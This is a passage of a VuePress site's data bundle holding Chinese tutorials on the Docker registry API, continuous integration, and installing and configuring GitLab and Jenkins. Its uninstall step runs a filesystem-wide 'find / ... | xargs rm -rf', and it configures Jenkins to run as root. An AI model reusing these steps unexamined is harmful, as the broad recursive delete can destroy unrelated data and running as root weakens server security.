docker 建议使用 v2 版本，所以请求路径需要带上，如： http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * 检查连接（一定要考虑兼容）\n\nget /v2/\n返回 200 代表ok\n返回 401 代表需要身份验证\n返回 404 代表注册表未实现 /v2/，有可能就是 v1\n\n\n1\n2\n3\n4\n\n * 列出存储库：\n\n// 获取全部\nget /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// 分页获取\nget /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 列出镜像 tags\n\n/v2/<imagesname>/tags/list \n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(一) 持续集成及Jenkins介绍",frontmatter:{title:"Jenkins(一) 持续集成及Jenkins介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/500",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/500.Jenkins(%E4%B8%80)%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%8F%8AJenkins%E4%BB%8B%E7%BB%8D.html",relativePath:"04.运维/50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.md",key:"v-909b2404",path:"/jenkins/500/",headers:[{level:2,title:"什么是持续集成",slug:"什么是持续集成",normalizedTitle:"什么是持续集成",charIndex:2},{level:3,title:"持续集成的组成要素",slug:"持续集成的组成要素",normalizedTitle:"持续集成的组成要素",charIndex:720},{level:3,title:"持续集成的好处",slug:"持续集成的好处",normalizedTitle:"持续集成的好处",charIndex:902},{level:2,title:"Jenkins介绍",slug:"jenkins介绍",normalizedTitle:"jenkins 介绍",charIndex:1039}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"什么是持续集成 持续集成的组成要素 持续集成的好处 Jenkins介绍",content:"# 什么是持续集成\n\n持续集成（ Continuous integration ， 简称 CI ）指的是，频繁地（一天多次）将代码集成到主干。\n\n持续集成的目的，就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是，代码集成到主干之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。\n\n通过持续集成， 团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归功于持续集成。\n\n\n\n根据持续集成的设计，代码从提交到生产，整个过程有以下几步。\n\n * 提交\n   流程的第一步，是开发者向代码仓库提交代码。所有后面的步骤都始于本地代码的一次提交（commit）。\n * 测试（第一轮）\n   代码仓库对 commit 操作配置了钩子（hook），只要提交代码或者合并进主干，就会跑自动化测试。\n * 构建\n   通过第一轮测试，代码就可以合并进主干，就算可以交付了。\n   交付后，就先进行构建（build），再进入第二轮测试。所谓构建，指的是将源码转换为可以运行的实际代码，比如安装依赖，配置各种资源（样式表、JS 脚本、图片）等等。\n * 测试（第二轮）\n   构建完成，就要进行第二轮测试。如果第一轮已经涵盖了所有测试内容，第二轮可以省略，当然，这时构建步骤也要移到第一轮测试前面。\n * 部署\n   过了第二轮测试，当前代码就是一个可以直接部署的版本（artifact）。将这个版本的所有文件打包（tar filename.tar * ）存档，发到生产服务器。\n * 回滚\n   一旦当前版本发生问题，就要回滚到上一个版本的构建结果。最简单的做法就是修改一下符号链接，指向上一个版本的目录。\n\n\n# 持续集成的组成要素\n\n * 一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成的， 无需人工干预。\n * 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般使用 SVN 或 Git。\n * 一个持续集成服务器， Jenkins 就是一个配置简单和使用方便的持续集成服务器。\n\n\n\n\n# 持续集成的好处\n\n1、降低风险，由于持续集成不断去构建，编译和测试，可以很早期发现问题，所以修复的代价就少；\n2、对系统健康持续检查，减少发布风险带来的问题；\n3、减少重复性工作；\n4、持续部署，提供可部署单元包；\n5、持续交付可供使用的版本；\n6、增强团队信心；\n\n\n# Jenkins 介绍\n\nJenkins 是一款流行的开源持续集成（Continuous Integration）工具，广泛用于项目开发，具有自动化构建、测试和部署等功能。官网： http://jenkins-ci.org/。\n\nJenkins 的特征：\n\n * 开源的 Java 语言开发持续集成工具，支持持续集成，持续部署。\n * 易于安装部署配置：可通过 yum 安装，或下载 war 包以及通过 docker 容器等快速实现安装部署，可方便 web 界面配置管理。\n * 消息通知及测试报告：集成 RSS/E-mail 通过 RSS 发布构建结果或当构建完成时通过 e-mail 通知，生成 JUnit/TestNG 测试报告。\n * 分布式构建：支持 Jenkins 能够让多台计算机一起构建 / 测试。\n * 文件识别：Jenkins 能够跟踪哪次构建生成哪些 jar，哪次构建使用哪个版本的 jar 等。\n * 丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如 git，svn，maven，docker 等。",normalizedContent:"# 什么是持续集成\n\n持续集成（ continuous integration ， 简称 ci ）指的是，频繁地（一天多次）将代码集成到主干。\n\n持续集成的目的，就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是，代码集成到主干之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。\n\n通过持续集成， 团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归功于持续集成。\n\n\n\n根据持续集成的设计，代码从提交到生产，整个过程有以下几步。\n\n * 提交\n   流程的第一步，是开发者向代码仓库提交代码。所有后面的步骤都始于本地代码的一次提交（commit）。\n * 测试（第一轮）\n   代码仓库对 commit 操作配置了钩子（hook），只要提交代码或者合并进主干，就会跑自动化测试。\n * 构建\n   通过第一轮测试，代码就可以合并进主干，就算可以交付了。\n   交付后，就先进行构建（build），再进入第二轮测试。所谓构建，指的是将源码转换为可以运行的实际代码，比如安装依赖，配置各种资源（样式表、js 脚本、图片）等等。\n * 测试（第二轮）\n   构建完成，就要进行第二轮测试。如果第一轮已经涵盖了所有测试内容，第二轮可以省略，当然，这时构建步骤也要移到第一轮测试前面。\n * 部署\n   过了第二轮测试，当前代码就是一个可以直接部署的版本（artifact）。将这个版本的所有文件打包（tar filename.tar * ）存档，发到生产服务器。\n * 回滚\n   一旦当前版本发生问题，就要回滚到上一个版本的构建结果。最简单的做法就是修改一下符号链接，指向上一个版本的目录。\n\n\n# 持续集成的组成要素\n\n * 一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成的， 无需人工干预。\n * 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般使用 svn 或 git。\n * 一个持续集成服务器， jenkins 就是一个配置简单和使用方便的持续集成服务器。\n\n\n\n\n# 持续集成的好处\n\n1、降低风险，由于持续集成不断去构建，编译和测试，可以很早期发现问题，所以修复的代价就少；\n2、对系统健康持续检查，减少发布风险带来的问题；\n3、减少重复性工作；\n4、持续部署，提供可部署单元包；\n5、持续交付可供使用的版本；\n6、增强团队信心；\n\n\n# jenkins 介绍\n\njenkins 是一款流行的开源持续集成（continuous integration）工具，广泛用于项目开发，具有自动化构建、测试和部署等功能。官网： http://jenkins-ci.org/。\n\njenkins 的特征：\n\n * 开源的 java 语言开发持续集成工具，支持持续集成，持续部署。\n * 易于安装部署配置：可通过 yum 安装，或下载 war 包以及通过 docker 容器等快速实现安装部署，可方便 web 界面配置管理。\n * 消息通知及测试报告：集成 rss/e-mail 通过 rss 发布构建结果或当构建完成时通过 e-mail 通知，生成 junit/testng 测试报告。\n * 分布式构建：支持 jenkins 能够让多台计算机一起构建 / 测试。\n * 文件识别：jenkins 能够跟踪哪次构建生成哪些 jar，哪次构建使用哪个版本的 jar 等。\n * 丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如 git，svn，maven，docker 等。",charsets:{cjk:!0}},{title:"Jenkins(二) Jenkins安装和环境配置",frontmatter:{title:"Jenkins(二) Jenkins安装和环境配置",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/501",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/501.Jenkins(%E4%BA%8C)%20Jenkins%E5%AE%89%E8%A3%85%E5%92%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html",relativePath:"04.运维/50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.md",key:"v-64e25eba",path:"/jenkins/501/",headers:[{level:2,title:"持续集成流程说明",slug:"持续集成流程说明",normalizedTitle:"持续集成流程说明",charIndex:2},{level:2,title:"Gitlab代码托管服务器安装",slug:"gitlab代码托管服务器安装",normalizedTitle:"gitlab 代码托管服务器安装",charIndex:433},{level:3,title:"Gitlab简介",slug:"gitlab简介",normalizedTitle:"gitlab 简介",charIndex:454},{level:3,title:"Gitlab安装",slug:"gitlab安装",normalizedTitle:"gitlab 安装",charIndex:763},{level:2,title:"Gitlab添加组、创建用户、创建项目",slug:"gitlab添加组、创建用户、创建项目",normalizedTitle:"gitlab 添加组、创建用户、创建项目",charIndex:1771},{level:2,title:"Jenkins安装",slug:"jenkins安装",normalizedTitle:"jenkins 安装",charIndex:2310},{level:2,title:"jenkins插件管理",slug:"jenkins插件管理",normalizedTitle:"jenkins 插件管理",charIndex:4225},{level:3,title:"修改Jenkins插件下载地址",slug:"修改jenkins插件下载地址",normalizedTitle:"修改 jenkins 插件下载地址",charIndex:4334},{level:2,title:"Jenkins 卸载",slug:"jenkins-卸载",normalizedTitle:"jenkins 卸载",charIndex:5079}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"持续集成流程说明 Gitlab代码托管服务器安装 Gitlab简介 Gitlab安装 Gitlab添加组、创建用户、创建项目 Jenkins安装 jenkins插件管理 修改Jenkins插件下载地址 Jenkins 卸载",content:'# 持续集成流程说明\n\n\n\n1. 首先，开发人员每天进行代码提交，提交到 Git 仓库\n2. 然后，Jenkins 作为持续集成工具，使用 Git 工具到 Git 仓库拉取代码到集成服务器，再配合 JDK，Maven 等软件完成代码编译，代码测试与审查，测试，打包等工作，在这个过程中每一步出错，都重新再执行一次整个流程。\n3. 最后，Jenkins 把生成的 jar 或 war 包分发到测试服务器或者生产服务器，测试人员或用户就可以访问应用。\n\n服务器列表\n\n名称         IP 地址            安装的软件\n代码托管服务器    192.168.66.100   Gitlab-12.4.2\n持续集成服务器    192.168.66.101   Jenkins-2.190.3，JDK1.8，Maven3.6.2，Git，SonarQube\n测试或生产服务器   192.168.66.102   JDK1.8，Tomcat8.5\n\n\n# Gitlab 代码托管服务器安装\n\n\n# Gitlab 简介\n\n官网： https://about.gitlab.com/\n\nGitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 web 服务。\n\nGitLab 和 GitHub 一样属于第三方基于 Git 开发的作品，免费且开源（基于 MIT 协议），与 Github 类似，可以注册用户，任意提交你的代码，添加 SSHKey 等等。不同的是，GitLab 是可以部署到自己的服务器上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放在别人的服务器上吧？简单来说可把 GitLab 看作个人版的 GitHub。\n\n\n# Gitlab 安装\n\n1. 安装相关依赖\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. 启动 ssh 服务 & 设置为开机启动\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. 设置 postfix 开机自启，并启动，postfix 支持 gitlab 发信功能\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. 开放 ssh 以及 http 服务，然后重新加载防火墙列表\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> 如果关闭防火墙就不需要做以上配置\n\n5. 下载 gitlab 包，并且安装\n在线下载安装包：\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# 安装\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. 修改 gitlab 配置\n\nvi /etc/gitlab/gitlab.rb\n# 修改gitlab访问地址和端口，默认为80，我们改为82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. 重载配置及启动 gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. 把端口添加到防火墙\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\n启动成功后，看到以下修改管理员 root 密码的页面，修改密码后，然后登录即可\n\n\n# Gitlab 添加组、创建用户、创建项目\n\n1. 创建组\n使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限，不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的管理\n\n2. 创建用户\n创建用户的时候，可以选择 Regular 或 Admin 类型。创建完用户后，立即修改密码\n\n3. 将用户添加到组中\n选择某个用户组，进行 Members 管理组的成员\n\nGitlab 用户在组里面有 5 种不同权限：\n\n * Guest：可以创建 issue、发表评论，不能读写版本库 Reporter：可以克隆代码，不能提交，QA、PM 可以赋予这个权限\n * Developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限\n * Maintainer：可以创建项目、添加 tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个权限\n * Owner：可以设置项目访问权限 - Visibility Level、删除项目、迁移项目、管理组成员，开发组组长可以赋予这个权限\n\n4. 在用户组中创建项目\n以刚才创建的新用户身份登录到 Gitlab，然后在用户组中创建新的项目\n\n\n# Jenkins 安装\n\n1. 获取 jenkins 安装包，下载页面：http://mirrors.jenkins-ci.org/redhat/\n\n# 国内环境不是那么好，下载要科学\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# 安装\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. 修改 Jenkins 配置\n\nvim /etc/sysconfig/jenkins\n# 修改内容如下\n# 能执行jenkins的用户权限\nJENKINS_USER="root" \n# 页面访问端口\nJENKINS_PORT="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. 启动 Jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> 报错\n> Starting Jenkins bash: /usr/bin/java: 没有那个文件或目录\n> Failed to start LSB: Jenkins Automation Server.\n> 是因为 jenkins 内部自己配置了 java 地址，需要改一下。\n> vim /etc/init.d/jenkins\n> /usr/bin/java 找到，并改成自己的 java 地址，我的是 /opt/software/java8/jre/bin/java，注意这里找的是 jre 的。\n> 执行 systemctl daemon-reload，在执行 systemctl start jenkins\n\n> 最新版本 Jenkins 2.346.1 和之前版本还是有不一样的地方，这里只说几个 Jenkins 2.346.1 遇到的报错：\n> 1 Aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid Java installation 这种报错一直说是没安装 JAVA，但是我明明按照以上方式都配置过了，最终解决方式就是编辑 vim /usr/lib/systemd/system/jenkins.service 文件，找到被注释的 Environment="JAVA_HOME="，把自己的 JAVA 路径写上，如 /opt/software/jdk\n> 2 Aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.BindException: Address already in use 你会发现在 vim /etc/sysconfig/jenkins 文件都改过了，但还是端口占用，依然需要修改 vim /usr/lib/systemd/system/jenkins.service 文件，并编辑 Environment="JENKINS_PORT=7777" 改成自己需要的端口\n> 3 Aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: Caused: java.io.IOException: Failed to start Jetty 检查所有配置包括 /etc/sysconfig/jenkins 和 /usr/lib/systemd/system/jenkins.service，却报配置正确\n> 4 Aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid Java version: java version "17.0.3.1" 2022-04-22 LTS JAVA 版本过高或过低导致，我用 java17 或 11 直接不行，换成 8 就好了\n\n4. 打开浏览器访问\nhttp://192.168.66.101:7777\n\n> 注意：本服务器把防火墙关闭了，如果开启防火墙，需要在防火墙添加端口\n\n5. 获取并输入 admin 账户密码\n\ncat /var/lib/jenkins/secrets/initialAdminPassword\n\n\n1\n\n\n6. 添加一个管理员账户，并进入 Jenkins 后台\n\n7. 跳过插件安装\n因为 Jenkins 插件需要连接默认官网下载，速度非常慢，而且经过会失败，所以我们暂时先跳过插件安装\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins 插件管理\n\nJenkins 本身不提供很多功能，我们可以通过使用插件来满足我们的使用。例如从 Gitlab 拉取代码，使用 Maven 构建项目等功能需要依靠插件完成。接下来演示如何下载插件。\n\n\n# 修改 Jenkins 插件下载地址\n\nJenkins 国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址：Jenkins->Manage Jenkins->Manage Plugins，点击 Available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\n此时我们可以进入 /var/lib/jenkins/updates，看到有个 default.json，这个文件里面是所有插件的地址，这里面的地址目前全是国外的地址，可以用以下命令进行替换到国内地址。\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\n最后，Manage Plugins 点击 Advanced，把 Update Site 改为国内插件下载地址\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\n重启 jenkins ，在访问路径后面键入 restart 即可。\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\n重启好后，我们进行对 jenkins 进行汉化。\n\n\n\n\n\n> jenkins 版本更新太快，包括核心库也会更新，大家可以放心更新，不用怕，最多就是起不来重装。\n\n\n# Jenkins 卸载\n\n先停止 Jenkins 的运行\n\n# 方式一\nsystemctl stop jenkins\n# 方式二\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\n找到所有跟 Jenkins 相关的包\n\nrpm -qc jenkins\n\n\n1\n\n\n卸载相关包\n\nrpm -e jenkins\n\n\n1\n\n\n检查是否卸载成功\n\nrpm -ql jenkins\n\n\n1\n\n\n删除参与文件\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',normalizedContent:'# 持续集成流程说明\n\n\n\n1. 首先，开发人员每天进行代码提交，提交到 git 仓库\n2. 然后，jenkins 作为持续集成工具，使用 git 工具到 git 仓库拉取代码到集成服务器，再配合 jdk，maven 等软件完成代码编译，代码测试与审查，测试，打包等工作，在这个过程中每一步出错，都重新再执行一次整个流程。\n3. 最后，jenkins 把生成的 jar 或 war 包分发到测试服务器或者生产服务器，测试人员或用户就可以访问应用。\n\n服务器列表\n\n名称         ip 地址            安装的软件\n代码托管服务器    192.168.66.100   gitlab-12.4.2\n持续集成服务器    192.168.66.101   jenkins-2.190.3，jdk1.8，maven3.6.2，git，sonarqube\n测试或生产服务器   192.168.66.102   jdk1.8，tomcat8.5\n\n\n# gitlab 代码托管服务器安装\n\n\n# gitlab 简介\n\n官网： https://about.gitlab.com/\n\ngitlab 是一个用于仓库管理系统的开源项目，使用 git 作为代码管理工具，并在此基础上搭建起来的 web 服务。\n\ngitlab 和 github 一样属于第三方基于 git 开发的作品，免费且开源（基于 mit 协议），与 github 类似，可以注册用户，任意提交你的代码，添加 sshkey 等等。不同的是，gitlab 是可以部署到自己的服务器上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放在别人的服务器上吧？简单来说可把 gitlab 看作个人版的 github。\n\n\n# gitlab 安装\n\n1. 安装相关依赖\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. 启动 ssh 服务 & 设置为开机启动\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. 设置 postfix 开机自启，并启动，postfix 支持 gitlab 发信功能\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. 开放 ssh 以及 http 服务，然后重新加载防火墙列表\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> 如果关闭防火墙就不需要做以上配置\n\n5. 下载 gitlab 包，并且安装\n在线下载安装包：\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# 安装\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. 修改 gitlab 配置\n\nvi /etc/gitlab/gitlab.rb\n# 修改gitlab访问地址和端口，默认为80，我们改为82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. 重载配置及启动 gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. 把端口添加到防火墙\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\n启动成功后，看到以下修改管理员 root 密码的页面，修改密码后，然后登录即可\n\n\n# gitlab 添加组、创建用户、创建项目\n\n1. 创建组\n使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限，不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的管理\n\n2. 创建用户\n创建用户的时候，可以选择 regular 或 admin 类型。创建完用户后，立即修改密码\n\n3. 将用户添加到组中\n选择某个用户组，进行 members 管理组的成员\n\ngitlab 用户在组里面有 5 种不同权限：\n\n * guest：可以创建 issue、发表评论，不能读写版本库 reporter：可以克隆代码，不能提交，qa、pm 可以赋予这个权限\n * developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限\n * maintainer：可以创建项目、添加 tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个权限\n * owner：可以设置项目访问权限 - visibility level、删除项目、迁移项目、管理组成员，开发组组长可以赋予这个权限\n\n4. 在用户组中创建项目\n以刚才创建的新用户身份登录到 gitlab，然后在用户组中创建新的项目\n\n\n# jenkins 安装\n\n1. 获取 jenkins 安装包，下载页面：http://mirrors.jenkins-ci.org/redhat/\n\n# 国内环境不是那么好，下载要科学\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# 安装\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. 修改 jenkins 配置\n\nvim /etc/sysconfig/jenkins\n# 修改内容如下\n# 能执行jenkins的用户权限\njenkins_user="root" \n# 页面访问端口\njenkins_port="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. 启动 jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> 报错\n> starting jenkins bash: /usr/bin/java: 没有那个文件或目录\n> failed to start lsb: jenkins automation server.\n> 是因为 jenkins 内部自己配置了 java 地址，需要改一下。\n> vim /etc/init.d/jenkins\n> /usr/bin/java 找到，并改成自己的 java 地址，我的是 /opt/software/java8/jre/bin/java，注意这里找的是 jre 的。\n> 执行 systemctl daemon-reload，在执行 systemctl start jenkins\n\n> 最新版本 jenkins 2.346.1 和之前版本还是有不一样的地方，这里只说几个 jenkins 2.346.1 遇到的报错：\n> 1 aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid java installation 这种报错一直说是没安装 java，但是我明明按照以上方式都配置过了，最终解决方式就是编辑 vim /usr/lib/systemd/system/jenkins.service 文件，找到被注释的 environment="java_home="，把自己的 java 路径写上，如 /opt/software/jdk\n> 2 aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.bindexception: address already in use 你会发现在 vim /etc/sysconfig/jenkins 文件都改过了，但还是端口占用，依然需要修改 vim /usr/lib/systemd/system/jenkins.service 文件，并编辑 environment="jenkins_port=7777" 改成自己需要的端口\n> 3 aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: caused: java.io.ioexception: failed to start jetty 检查所有配置包括 /etc/sysconfig/jenkins 和 /usr/lib/systemd/system/jenkins.service，却报配置正确\n> 4 aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid java version: java version "17.0.3.1" 2022-04-22 lts java 版本过高或过低导致，我用 java17 或 11 直接不行，换成 8 就好了\n\n4. 打开浏览器访问\nhttp://192.168.66.101:7777\n\n> 注意：本服务器把防火墙关闭了，如果开启防火墙，需要在防火墙添加端口\n\n5. 获取并输入 admin 账户密码\n\ncat /var/lib/jenkins/secrets/initialadminpassword\n\n\n1\n\n\n6. 添加一个管理员账户，并进入 jenkins 后台\n\n7. 跳过插件安装\n因为 jenkins 插件需要连接默认官网下载，速度非常慢，而且经过会失败，所以我们暂时先跳过插件安装\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins 插件管理\n\njenkins 本身不提供很多功能，我们可以通过使用插件来满足我们的使用。例如从 gitlab 拉取代码，使用 maven 构建项目等功能需要依靠插件完成。接下来演示如何下载插件。\n\n\n# 修改 jenkins 插件下载地址\n\njenkins 国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址：jenkins->manage jenkins->manage plugins，点击 available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\n此时我们可以进入 /var/lib/jenkins/updates，看到有个 default.json，这个文件里面是所有插件的地址，这里面的地址目前全是国外的地址，可以用以下命令进行替换到国内地址。\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\n最后，manage plugins 点击 advanced，把 update site 改为国内插件下载地址\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\n重启 jenkins ，在访问路径后面键入 restart 即可。\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\n重启好后，我们进行对 jenkins 进行汉化。\n\n\n\n\n\n> jenkins 版本更新太快，包括核心库也会更新，大家可以放心更新，不用怕，最多就是起不来重装。\n\n\n# jenkins 卸载\n\n先停止 jenkins 的运行\n\n# 方式一\nsystemctl stop jenkins\n# 方式二\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\n找到所有跟 jenkins 相关的包\n\nrpm -qc jenkins\n\n\n1\n\n\n卸载相关包\n\nrpm -e jenkins\n\n\n1\n\n\n检查是否卸载成功\n\nrpm -ql jenkins\n\n\n1\n\n\n删除参与文件\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(三) Jenkins用户管理及凭证",frontmatter:{title:"Jenkins(三) Jenkins用户管理及凭证",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/502",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/502.Jenkins(%E4%B8%89)%20Jenkins%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E5%87%AD%E8%AF%81.html",relativePath:"04.运维/50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.md",key:"v-4e70a85e",path:"/jenkins/502/",headers:[{level:2,title:"用户管理",slug:"用户管理",normalizedTitle:"用户管理",charIndex:2},{level:3,title:"安装Role-based Authorization Strategy插件",slug:"安装role-based-authorization-strategy插件",normalizedTitle:"安装 role-based authorization strategy 插件",charIndex:72},{level:3,title:"修改安全配置策略",slug:"修改安全配置策略",normalizedTitle:"修改安全配置策略",charIndex:118},{level:3,title:"分配角色和用户",slug:"分配角色和用户",normalizedTitle:"分配角色和用户",charIndex:135},{level:3,title:"建立项目",slug:"建立项目",normalizedTitle:"建立项目",charIndex:696},{level:2,title:"Jenkins凭证管理",slug:"jenkins凭证管理",normalizedTitle:"jenkins 凭证管理",charIndex:713},{level:3,title:"安装Credentials Binding插件",slug:"安装credentials-binding插件",normalizedTitle:"安装 credentials binding 插件",charIndex:807},{level:3,title:"安装Git插件和Git工具",slug:"安装git插件和git工具",normalizedTitle:"安装 git 插件和 git 工具",charIndex:1296},{level:3,title:"添加凭证（username & password）",slug:"添加凭证-username-password",normalizedTitle:"添加凭证（username &amp; password）",charIndex:null},{level:3,title:"SSH 密钥类型",slug:"ssh-密钥类型",normalizedTitle:"ssh 密钥类型",charIndex:1680}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"用户管理 安装Role-based Authorization Strategy插件 修改安全配置策略 分配角色和用户 建立项目 Jenkins凭证管理 安装Credentials Binding插件 安装Git插件和Git工具 添加凭证（username & password） SSH 密钥类型",content:'# 用户管理\n\n我们可以利用 Role-based Authorization Strategy 插件来管理 Jenkins 用户权限\n\n\n# 安装 Role-based Authorization Strategy 插件\n\n\n\n\n# 修改安全配置策略\n\n\n\n\n\n\n# 分配角色和用户\n\n\n\n\n\n\n\nGlobal roles（全局角色）：管理员等高级用户可以创建基于全局的角色\nItem roles（项目角色）：针对某个或者某些项目的角色\nNode roles（节点角色）：节点相关的权限\n\n我们添加以下三个角色：\n\n * baseRole：该角色为全局角色。这个角色需要绑定 Overall 下面的 Read 权限，是为了给所有用户绑定最基本的 Jenkins 访问权限。注意：如果不给后续用户绑定这个角色，会报错误：用户名 ismissing the Overall/Read permission\n * role1：该角色为项目角色。使用正则表达式绑定 "itcast.*"，意思是只能操作 itcast 开头的项目。\n * role2：该角色也为项目角色。绑定 "itheima.*"，意思是只能操作 itheima 开头的项目。\n\n\n\n\n\n\n\n\n\n在系统管理页面进入 Manage Users\n\n\n\n\n\n给用户分配角色\n系统管理页面进入 Manage and Assign Roles，点击 Assign Roles\n绑定规则如下：\nroot1 用户分别绑定 baseRole 和 role1 